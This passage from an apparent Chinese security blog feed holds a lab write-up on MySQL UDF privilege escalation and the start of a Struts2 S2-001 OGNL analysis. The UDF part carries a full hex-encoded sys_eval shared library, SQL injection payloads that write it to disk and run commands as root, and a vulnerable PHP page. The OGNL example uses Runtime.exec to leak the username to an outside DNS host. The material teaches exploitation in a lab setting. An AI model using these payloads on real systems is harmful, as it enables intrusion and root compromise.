class="keyword">char</span> *is_null</span></span></span><br><span class="line"><span class="function"><span class="params">,<span class="keyword">char</span> *error</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>&#123;</span><br><span class="line">FILE *pipe;</span><br><span class="line"><span class="keyword">char</span> line[<span class="number">1024</span>];</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> outlen, linelen;</span><br><span class="line"></span><br><span class="line">result = <span class="built_in">malloc</span>(<span class="number">1</span>);</span><br><span class="line">outlen = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">pipe = popen(args-&gt;args[<span class="number">0</span>], <span class="string">&quot;r&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (fgets(line, <span class="keyword">sizeof</span>(line), pipe) != <span class="literal">NULL</span>) &#123;</span><br><span class="line">linelen = <span class="built_in">strlen</span>(line);</span><br><span class="line">result = <span class="built_in">realloc</span>(result, outlen + linelen);</span><br><span class="line"><span class="built_in">strncpy</span>(result + outlen, line, linelen);</span><br><span class="line">outlen = outlen + linelen;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">pclose(pipe);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!(*result) || result == <span class="literal">NULL</span>) &#123;</span><br><span class="line">*is_null = <span class="number">1</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">result[outlen] = <span class="number">0x00</span>;</span><br><span class="line">*length = <span class="built_in">strlen</span>(result);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>思考:对于第三方导入的函数其对应的操作是由我们mysql去完成的,如果mysql是由root用户启动,那么自定义函数的一切操作都是由root身份去完成的,也就是说如果这个时候我们能在so文件中加载一个执行命令的函数,那么我们执行的一切都是通过root身份去执行的.</p><h1 id="由sql注入到提权"><a href="#由sql注入到提权" class="headerlink" title="由sql注入到提权"></a>由sql注入到提权</h1><p>我搭建了一个简易的web环境,其中存在sql注入</p><img src="/2022/01/14/UDF%E6%8F%90%E6%9D%83/image-20220114185910652.png" class title="image-20220114185910652"><p>后端代码:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;conn.php&quot;</span>;</span><br><span class="line">@<span class="variable">$cmd</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">@<span class="variable">$id</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$cmd</span>)&#123;</span><br><span class="line">    system(<span class="variable">$cmd</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$id</span>)&#123;</span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM user WHERE id = &quot;</span>.<span class="variable">$id</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;执行的sql语句:&quot;</span>.<span class="variable">$sql</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    mysqli_multi_query(<span class="variable">$link</span>,<span class="variable">$sql</span>);</span><br><span class="line">    <span class="variable">$result</span> = mysqli_store_result(<span class="variable">$link</span>);</span><br><span class="line">    <span class="variable">$result_arr</span> = mysqli_fetch_assoc(<span class="variable">$result</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$result_arr</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>简单分析一下,很明显,sql语句存在拼接,存在sql注入,并且使用了mysqli_multi_query()可执行多条sql语句,cmd参数会直接命令执行</p><p>尝试命令执行,发现根目录存在flag文件</p><img src="/2022/01/14/UDF%E6%8F%90%E6%9D%83/image-20220114190046862.png" class title="image-20220114190046862"><p>当前权限为www-data:</p><img src="/2022/01/14/UDF%E6%8F%90%E6%9D%83/image-20220114192632122.png" class title="image-20220114192632122"><p>尝试读取,无法读取,权限不足</p><img src="/2022/01/14/UDF%E6%8F%90%E6%9D%83/image-20220114190157775.png" class title="image-20220114190157775"><p>因为存在sql注入,考虑通过利用sql注入写入恶意.so文件,利用mysql进行命令执行,读取flag</p><p>so文件路径一般默认为/usr/lib/mysql/plugin/</p><p>将我们准备好的so文件进行16进制编码,这里的方法有很多种,不做解释,编码完成的结果如下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x7f454c4602010100000000000000000003003e0001000000d00c0000000000004000000000000000e8180000000000000000000040003800050040001a00190001000000050000000000000000000000000000000000000000000000000000001415000000000000141500000000000000002000000000000100000006000000181500000000000018152000000000001815200000000000700200000000000080020000000000000000200000000000020000000600000040150000000000004015200000000000401520000000000090010000000000009001000000000000080000000000000050e57464040000006412000000000000641200000000000064120000000000009c000000000000009c00000000000000040000000000000051e5746406000000000000000000000000000000000000000000000000000000000000000000000000000000000000000800000000000000250000002b0000001500000005000000280000001e000000000000000000000006000000000000000c00000000000000070000002a00000009000000210000000000000000000000270000000b0000002200000018000000240000000e00000000000000040000001d0000001600000000000000130000000000000000000000120000002300000010000000250000001a0000000f000000000000000000000000000000000000001b00000000000000030000000000000000000000000000000000000000000000000000002900000014000000000000001900000020000000000000000a00000011000000000000000000000000000000000000000d0000002600000017000000000000000800000000000000000000000000000000000000000000001f0000001c0000000000000000000000000000000000000000000000020000000000000011000000140000000200000007000000800803499119c4c93da4400398046883140000001600000017000000190000001b0000001d0000002000000022000000000000002300000000000000240000002500000027000000290000002a00000000000000ce2cc0ba673c7690ebd3ef0e78722788b98df10ed871581cc1e2f7dea868be12bbe3927c7e8b92cd1e7066a9c3f9bfba745bb073371974ec4345d5ecc5a62c1cc3138aff36ac68ae3b9fd4a0ac73d1c525681b320b5911feab5fbe120000000000000000000000000000000000000000000000000000000003000900a00b0000000000000000000000000000010000002000000000000000000000000000000000000000250000002000000000000000000000000000000000000000e0000000120000000000000000000000de01000000000000790100001200000000000000000000007700000000000000ba0000001200000000000000000000003504000000000000f5000000120000000000000000000000c2010000000000009e010000120000000000000000000000d900000000000000fb000000120000000000000000000000050000000000000016000000220000000000000000000000fe00000000000000cf000000120000000000000000000000ad00000000000000880100001200000000000000000000008000000000000000ab010000120000000000000000000000250100000000000010010000120000000000000000000000dc00000000000000c7000000120000000000000000000000c200000000000000b5000000120000000000000000000000cc02000000000000ed000000120000000000000000000000e802000000000000e70000001200000000000000000000009b00000000000000c200000012000000000000000000000028000000000000008001000012000b007a100000000000006e000000000000007500000012000b00a70d00000000000001000000000000001000000012000c00781100000000000000000000000000003f01000012000b001a100000000000002d000000000000001f01000012000900a00b0000000000000000000000000000c30100001000f1ff881720000000000000000000000000009600000012000b00ab0d00000000000001000000000000007001000012000b0066100000000000001400000000000000cf0100001000f1ff981720000000000000000000000000005600000012000b00a50d00000000000001000000000000000201000012000b002e0f0000000000002900000000000000a301000012000b00f71000000000000041000000000000003900000012000b00a40d00000000000001000000000000003201000012000b00ea0f0000000000003000000000000000bc0100001000f1ff881720000000000000000000000000006500000012000b00a60d00000000000001000000000000002501000012000b00800f0000000000006a000000000000008500000012000b00a80d00000000000003000000000000001701000012000b00570f00000000000029000000000000005501000012000b0047100000000000001f00000000000000a900000012000b00ac0d0000000000009a000000000000008f01000012000b00e8100000000000000f00000000000000d700000012000b00460e000000000000e800000000000000005f5f676d6f6e5f73746172745f5f005f66696e69005f5f6378615f66696e616c697a65005f4a765f5265676973746572436c6173736573006c69625f6d7973716c7564665f7379735f696e666f5f6465696e6974007379735f6765745f6465696e6974007379735f657865635f6465696e6974007379735f6576616c5f6465696e6974007379735f62696e6576616c5f696e6974007379735f62696e6576616c5f6465696e6974007379735f62696e6576616c00666f726b00737973636f6e66006d6d6170007374726e6370790077616974706964007379735f6576616c006d616c6c6f6300706f70656e007265616c6c6f630066676574730070636c6f7365007379735f6576616c5f696e697400737472637079007379735f657865635f696e6974007379735f7365745f696e6974007379735f6765745f696e6974006c69625f6d7973716c7564665f7379735f696e666f006c69625f6d7973716c7564665f7379735f696e666f5f696e6974007379735f657865630073797374656d007379735f73657400736574656e76007379735f7365745f6465696e69740066726565007379735f67657400676574656e76006c6962632e736f2e36005f6564617461005f5f6273735f7374617274005f656e6400474c4942435f322e322e35000000000000000000020002000200020002000200020002000200020002000200020002000200020001000100010001000100010001000100010001000100010001000100010001000100010001000100010001000100000001000100b20100001000000000000000751a690900000200d401000000000000801720000000000008000000000000008017200000000000d01620000000000006000000020000000000000000000000d81620000000000006000000030000000000000000000000e016200000000000060000000a00000000000000000000000017200000000000070000000400000000000000000000000817200000000000070000000500000000000000000000001017200000000000070000000600000000000000000000001817200000000000070000000700000000000000000000002017200000000000070000000800000000000000000000002817200000000000070000000900000000000000000000003017200000000000070000000a00000000000000000000003817200000000000070000000b00000000000000000000004017200000000000070000000c00000000000000000000004817200000000000070000000d00000000000000000000005017200000000000070000000e00000000000000000000005817200000000000070000000f00000000000000000000006017200000000000070000001000000000000000000000006817200000000000070000001100000000000000000000007017200000000000070000001200000000000000000000007817200000000000070000001300000000000000000000004883ec08e827010000e8c2010000e88d0500004883c408c3ff35320b2000ff25340b20000f1f4000ff25320b20006800000000e9e0ffffffff252a0b20006801000000e9d0ffffffff25220b20006802000000e9c0ffffffff251a0b20006803000000e9b0ffffffff25120b20006804000000e9a0ffffffff250a0b20006805000000e990ffffffff25020b20006806000000e980ffffffff25fa0a20006807000000e970ffffffff25f20a20006808000000e960ffffffff25ea0a20006809000000e950ffffffff25e20a2000680a000000e940ffffffff25da0a2000680b000000e930ffffffff25d20a2000680c000000e920ffffffff25ca0a2000680d000000e910ffffffff25c20a2000680e000000e900ffffffff25ba0a2000680f000000e9f0feffff00000000000000004883ec08488b05f50920004885c07402ffd04883c408c390909090909090909055803d900a2000004889e5415453756248833dd809200000740c488b3d6f0a2000e812ffffff488d05130820004c8d2504082000488b15650a20004c29e048c1f803488d58ff4839da73200f1f440000488d4201488905450a200041ff14c4488b153a0a20004839da72e5c605260a2000015b415cc9c3660f1f8400000000005548833dbf072000004889e57422488b05530920004885c07416488d3da70720004989c3c941ffe30f1f840000000000c9c39090c3c3c3c331c0c3c341544883c9ff4989f455534883ec10488b4610488b3831c0f2ae48f7d1488d69ffe8b6feffff83f80089c77c61754fbf1e000000e803feffff488d70ff4531c94531c031ffb921000000ba07000000488d042e48f7d64821c6e8aefeffff4883f8ff4889c37427498b4424104889ea4889df488b30e852feffffffd3eb0cba0100000031f6e802feffff31c0eb05b8010000005a595b5d415cc34157bf00040000415641554531ed415455534889f34883ec1848894c24104c89442408e85afdffffbf010000004989c6e84dfdffffc600004889c5488b4310488d356a030000488b38e814feffff4989c7eb374c89f731c04883c9fff2ae4889ef48f7d1488d59ff4d8d641d004c89e6e8ddfdffff4a8d3c284889da4c89f64d89e54889c5e8a8fdffff4c89fabe080000004c89f7e818fdffff4885c075b44c89ffe82bfdffff807d0000750a488b442408c60001eb1f42c6442dff0031c04883c9ff4889eff2ae488b44241048f7d148ffc94889084883c4184889e85b5d415c415d415e415fc34883ec08833e014889d7750b488b460831d2833800740e488d353a020000e817fdffffb20188d05ec34883ec08833e014889d7750b488b460831d2833800740e488d3511020000e8eefcffffb20188d05fc3554889fd534889d34883ec08833e027409488d3519020000eb3f488b46088338007409488d3526020000eb2dc7400400000000488b4618488b384883c70248037808e801fcffff31d24885c0488945107511488d351f0200004889dfe887fcffffb20141585b88d05dc34883ec08833e014889f94889d77510488b46088338007507c6010131c0eb0e488d3576010000e853fcffffb0014159c34154488d35ef0100004989cc4889d7534889d34883ec08e832fcffff49c704241e0000004889d8415a5b415cc34883ec0831c0833e004889d7740e488d35d5010000e807fcffffb001415bc34883ec08488b4610488b38e862fbffff5a4898c34883ec28488b46184c8b4f104989f2488b08488b46104c89cf488b004d8d4409014889c6f3a44c89c7498b4218488b0041c6040100498b4210498b5218488b4008488b4a08ba010000004889c6f3a44c89c64c89cf498b4218488b400841c6040000e867fbffff4883c4284898c3488b7f104885ff7405e912fbffffc3554889cd534c89c34883ec08488b4610488b38e849fbffff4885c04889c27505c60301eb1531c04883c9ff4889d7f2ae48f7d148ffc948894d00595b4889d05dc39090909090909090554889e5534883ec08488b05c80320004883f8ff7419488d1dbb0320000f1f004883eb08ffd0488b034883f8ff75f14883c4085bc9c390904883ec08e86ffbffff4883c408c345787065637465642065786163746c79206f6e6520737472696e67207479706520706172616d657465720045787065637465642065786163746c792074776f20617267756d656e747300457870656374656420737472696e67207479706520666f72206e616d6520706172616d6574657200436f756c64206e6f7420616c6c6f63617465206d656d6f7279006c69625f6d7973716c7564665f7379732076657273696f6e20302e302e34004e6f20617267756d656e747320616c6c6f77656420287564663a206c69625f6d7973716c7564665f7379735f696e666f290000011b033b980000001200000040fbffffb400000041fbffffcc00000042fbffffe400000043fbfffffc00000044fbffff1401000047fbffff2c01000048fbffff44010000e2fbffff6c010000cafcffffa4010000f3fcffffbc0100001cfdffffd401000086fdfffff4010000b6fdffff0c020000e3fdffff2c02000002feffff4402000016feffff5c02000084feffff7402000093feffff8c0200001400000000000000017a5200017810011b0c070890010000140000001c00000084faffff01000000000000000000000014000000340000006dfaffff010000000000000000000000140000004c00000056faffff01000000000000000000000014000000640000003ffaffff010000000000000000000000140000007c00000028faffff030000000000000000000000140000009400000013faffff01000000000000000000000024000000ac000000fcf9ffff9a00000000420e108c02480e18410e20440e3083048603000000000034000000d40000006efaffffe800000000420e10470e18420e208d048e038f02450e28410e30410e38830786068c05470e50000000000000140000000c0100001efbffff2900000000440e100000000014000000240100002ffbffff2900000000440e10000000001c0000003c01000040fbffff6a00000000410e108602440e188303470e200000140000005c0100008afbffff3000000000440e10000000001c00000074010000a2fbffff2d00000000420e108c024e0e188303470e2000001400000094010000affbffff1f00000000440e100000000014000000ac010000b6fbffff1400000000440e100000000014000000c4010000b2fbffff6e00000000440e300000000014000000dc01000008fcffff0f00000000000000000000001c000000f4010000fffbffff4100000000410e108602440e188303470e2000000000000000000000ffffffffffffffff0000000000000000ffffffffffffffff000000000000000000000000000000000100000000000000b2010000000000000c00000000000000a00b0000000000000d00000000000000781100000000000004000000000000005801000000000000f5feff6f00000000a00200000000000005000000000000006807000000000000060000000000000060030000000000000a00000000000000e0010000000000000b0000000000000018000000000000000300000000000000e81620000000000002000000000000008001000000000000140000000000000007000000000000001700000000000000200a0000000000000700000000000000c0090000000000000800000000000000600000000000000009000000000000001800000000000000feffff6f00000000a009000000000000ffffff6f000000000100000000000000f0ffff6f000000004809000000000000f9ffff6f0000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000401520000000000000000000000000000000000000000000ce0b000000000000de0b000000000000ee0b000000000000fe0b0000000000000e0c0000000000001e0c0000000000002e0c0000000000003e0c0000000000004e0c0000000000005e0c0000000000006e0c0000000000007e0c0000000000008e0c0000000000009e0c000000000000ae0c000000000000be0c0000000000008017200000000000004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200002e7368737472746162002e676e752e68617368002e64796e73796d002e64796e737472002e676e752e76657273696f6e002e676e752e76657273696f6e5f72002e72656c612e64796e002e72656c612e706c74002e696e6974002e74657874002e66696e69002e726f64617461002e65685f6672616d655f686472002e65685f6672616d65002e63746f7273002e64746f7273002e6a6372002e64796e616d6963002e676f74002e676f742e706c74002e64617461002e627373002e636f6d6d656e7400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000f0000000500000002000000000000005801000000000000580100000000000048010000000000000300000000000000080000000000000004000000000000000b000000f6ffff6f0200000000000000a002000000000000a002000000000000c000000000000000030000000000000008000000000000000000000000000000150000000b00000002000000000000006003000000000000600300000000000008040000000000000400000002000000080000000000000018000000000000001d00000003000000020000000000000068070000000000006807000000000000e00100000000000000000000000000000100000000000000000000000000000025000000ffffff6f020000000000000048090000000000004809000000000000560000000000000003000000000000000200000000000000020000000000000032000000feffff6f0200000000000000a009000000000000a009000000000000200000000000000004000000010000000800000000000000000000000000000041000000040000000200000000000000c009000000000000c00900000000000060000000000000000300000000000000080000000000000018000000000000004b000000040000000200000000000000200a000000000000200a0000000000008001000000000000030000000a0000000800000000000000180000000000000055000000010000000600000000000000a00b000000000000a00b000000000000180000000000000000000000000000000400000000000000000000000000000050000000010000000600000000000000b80b000000000000b80b00000000000010010000000000000000000000000000040000000000000010000000000000005b000000010000000600000000000000d00c000000000000d00c000000000000a80400000000000000000000000000001000000000000000000000000000000061000000010000000600000000000000781100000000000078110000000000000e000000000000000000000000000000040000000000000000000000000000006700000001000000320000000000000086110000000000008611000000000000dd000000000000000000000000000000010000000000000001000000000000006f000000010000000200000000000000641200000000000064120000000000009c000000000000000000000000000000040000000000000000000000000000007d000000010000000200000000000000001300000000000000130000000000001402000000000000000000000000000008000000000000000000000000000000870000000100000003000000000000001815200000000000181500000000000010000000000000000000000000000000080000000000000000000000000000008e000000010000000300000000000000281520000000000028150000000000001000000000000000000000000000000008000000000000000000000000000000950000000100000003000000000000003815200000000000381500000000000008000000000000000000000000000000080000000000000000000000000000009a000000060000000300000000000000401520000000000040150000000000009001000000000000040000000000000008000000000000001000000000000000a3000000010000000300000000000000d016200000000000d0160000000000001800000000000000000000000000000008000000000000000800000000000000a8000000010000000300000000000000e816200000000000e8160000000000009800000000000000000000000000000008000000000000000800000000000000b1000000010000000300000000000000801720000000000080170000000000000800000000000000000000000000000008000000000000000000000000000000b7000000080000000300000000000000881720000000000088170000000000001000000000000000000000000000000008000000000000000000000000000000bc000000010000000000000000000000000000000000000088170000000000009b000000000000000000000000000000010000000000000000000000000000000100000003000000000000000000000000000000000000002318000000000000c500000000000000000000000000000001000000000000000000000000000000 </span><br></pre></td></tr></table></figure><p>构造payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1;select hexdata INTO DUMPFILE &#39;&#x2F;usr&#x2F;lib&#x2F;mysql&#x2F;plugin&#x2F;udf.so&#39;;</span><br></pre></td></tr></table></figure><p>这里的hexdata就是刚刚转换出来的16进制</p><p>**注:**这里使用INTO DUMPFILE进行文件写入,需要开启load_file()及secure_file_priv 没有限制</p><p>查看secure_file_priv:可以看到value为空,没有任何限制(这个限制,就是限制mysql允许写入文件的路径,为空就是允许所有)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">show global variables like &#39;%secure_file_priv%&#39;;</span><br><span class="line">+------------------+-------+</span><br><span class="line">| Variable_name    | Value |</span><br><span class="line">+------------------+-------+</span><br><span class="line">| secure_file_priv |       |</span><br><span class="line">+------------------+-------+</span><br></pre></td></tr></table></figure><p>构造payload写入udf.so</p><img src="/2022/01/14/UDF%E6%8F%90%E6%9D%83/image-20220114192106534.png" class title="image-20220114192106534"><p>创建自定义函数:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;-1;CREATE FUNCTION sys_eval RETURNS STRING SONAME &#39;udf.so&#39;;</span><br></pre></td></tr></table></figure><p>使用自定义函数执行命令:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;-1 union select 1,sys_eval(&#39;whoami&#39;);</span><br></pre></td></tr></table></figure><img src="/2022/01/14/UDF%E6%8F%90%E6%9D%83/image-20220114192459103.png" class title="image-20220114192459103"><p>可以看到此时已经是root权限了</p><p>读取flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;-1 union select 1,sys_eval(&#39;cat &#x2F;flag&#39;);</span><br></pre></td></tr></table></figure><img src="/2022/01/14/UDF%E6%8F%90%E6%9D%83/image-20220114192551918.png" class title="image-20220114192551918">]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;UDF（user-defined-function&quot;&gt;&lt;a href=&quot;#UDF（user-defined-function&quot; class=&quot;headerlink&quot; title=&quot;UDF（user defined function)&quot;&gt;&lt;/a&gt;UDF（user d</summary>
      
    
    
    
    
    <category term="udf提权" scheme="https://men9da.cn/tags/udf%E6%8F%90%E6%9D%83/"/>
    
  </entry>
  
  <entry>
    <title>Struts2-S2 001详细分析</title>
    <link href="https://men9da.cn/2022/01/09/Struts2-S001%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/"/>
    <id>https://men9da.cn/2022/01/09/Struts2-S001%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/</id>
    <published>2022-01-09T07:03:04.000Z</published>
    <updated>2022-03-07T11:47:43.918Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言:"></a>前言:</h1><p>本篇文章是站在一个只会一丁点java基础,没有任何Java开发经验的的菜鸡眼中去完成的.所设计知识点繁多,杂乱,从Struts2的执行流程到漏洞Rce,适合小白看.本次分析的是Struts2-S001,版本为2.0.8</p><h1 id="0X01-OGNL表达式"><a href="#0X01-OGNL表达式" class="headerlink" title="0X01:OGNL表达式"></a>0X01:OGNL表达式</h1><p><a href="https://commons.apache.org/proper/commons-ognl/">OGNL</a> 是 Object Graphic Navigation Language (对象图导航语言)的缩写，是一个开源项目。它是一种功能强大的表达式语言，通过它简单一致的表达式语法，可以存取对象的任意属性，调用对象的方法。</p><p>Struts2 中支持以下几种表达式语言：OGNL、JSTL、Groovy、Velocity。Struts 框架使用 OGNL 作为默认的表达式语言。</p><p>为什么这里要提到OGNL表达式呢?因为就是OGNL存在可以执行java代码的函数,而Struts2使用了OGNL进行开发,但是在这个过程中由于疏忽导致用户可控OGNL处理的表达式数据从而造成注入.</p><p>打个比方,就好比php里面开发者用了eval()函数,但是呢由于开发不严谨导致eval()函数的参数被用户可控了,那肯定就直接RCE了.</p><p>OGNL表达式到底怎么用呢?我们来举个例子</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.scenario.effect.impl.sw.sse.SSEBlend_SRC_OUTPeer;</span><br><span class="line"><span class="keyword">import</span> ognl.Ognl;</span><br><span class="line"><span class="keyword">import</span> ognl.OgnlContext;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> java.lang.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> Integer age;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">User</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">User</span><span class="params">(String name, Integer age)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>();</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> Integer <span class="title">getAge</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAge</span><span class="params">(Integer age)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        User rootUser = <span class="keyword">new</span> User(<span class="string">&quot;tom&quot;</span>,<span class="number">18</span>);</span><br><span class="line">        Map&lt;String, User&gt; context = <span class="keyword">new</span> HashMap&lt;String, User&gt;();</span><br><span class="line">        context.put(<span class="string">&quot;user1&quot;</span>,<span class="keyword">new</span> User(<span class="string">&quot;jack&quot;</span>,<span class="number">20</span>));</span><br><span class="line">        context.put(<span class="string">&quot;user2&quot;</span>,<span class="keyword">new</span> User(<span class="string">&quot;rose&quot;</span>,<span class="number">22</span>));</span><br><span class="line">        OgnlContext oc = <span class="keyword">new</span> OgnlContext();</span><br><span class="line">        <span class="comment">//ognl由root和context两部分组成</span></span><br><span class="line">        oc.setRoot(rootUser);</span><br><span class="line">        oc.setValues(context);</span><br><span class="line">        <span class="comment">//get ognl的root的值的时候，直接写希望获取的值的名字就可以了</span></span><br><span class="line">        String name = (String) Ognl.getValue(<span class="string">&quot;name&quot;</span>,oc,oc.getRoot());</span><br><span class="line">        Integer age = (Integer) Ognl.getValue(<span class="string">&quot;age&quot;</span>,oc,oc.getRoot());</span><br><span class="line">        <span class="comment">//get ognl非root的值的时候，需要使用#</span></span><br><span class="line">        User name1 = (User) Ognl.getValue(<span class="string">&quot;#context[&#x27;user1&#x27;]&quot;</span>,oc,oc.getRoot());</span><br><span class="line">        String name2 = (String) Ognl.getValue(<span class="string">&quot;#user2.name&quot;</span>,oc,oc.getRoot());</span><br><span class="line">        Integer age1 = (Integer) Ognl.getValue(<span class="string">&quot;#user1.age&quot;</span>,oc,oc.getRoot());</span><br><span class="line">        Integer age2 = (Integer) Ognl.getValue(<span class="string">&quot;#user2.age&quot;</span>,oc,oc.getRoot());</span><br><span class="line">        <span class="comment">//ognl的getValue函数可以直接执行java函数</span></span><br><span class="line">        Object obj = Ognl.getValue(<span class="string">&quot;&#x27;helloworld&#x27;.length()&quot;</span>,oc.getRoot());</span><br><span class="line">        System.out.println(obj);</span><br><span class="line">        <span class="comment">//访问静态属性和方法的时候需要使用@</span></span><br><span class="line">        Object obj2 = Ognl.getValue(<span class="string">&quot;@java.lang.Runtime@getRuntime().exec(&#x27;ping %USERNAME%.d6d10d38.toxiclog.xyz&#x27;)&quot;</span>,oc.getRoot());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这是网上看的一个OGNL表达式的使用例子,我们大致看一下就行了,重点看到</p><p>Ognl.getValue(“”,oc,getRoot())这个函数,等会儿我们分析Struts2的时候会看到他</p><p>Ognl.getValue()的第一个参数是表达式,这个表达式功能强大,按照OGNL的格式可以执行计算亦可以执行代码.</p><p>OGNL 主要有以下几种常见的使用：</p><ul><li>对于类属性的引用：<code>Class.field</code></li><li>方法调用： <code>Class.method()</code></li><li>静态方法/变量调用：<code>@org.su18.struts.Test@test(&#39;aaa&#39;)</code> 或 <code>@org.su18.struts.Constants@MY_CONSTANTS</code></li><li>创建 java 实例对象：完整类路径：<code>new java.util.ArrayList()</code></li><li>创建一个初始化 List：<code>&#123;&#39;a&#39;, &#39;b&#39;, &#39;c&#39;, &#39;d&#39;&#125;</code></li><li>创建一个 Map：<code>#@java.util.TreeMap@&#123;&#39;a&#39;:&#39;aa&#39;, &#39;b&#39;:&#39;bb&#39;, &#39;c&#39;:&#39;cc&#39;, 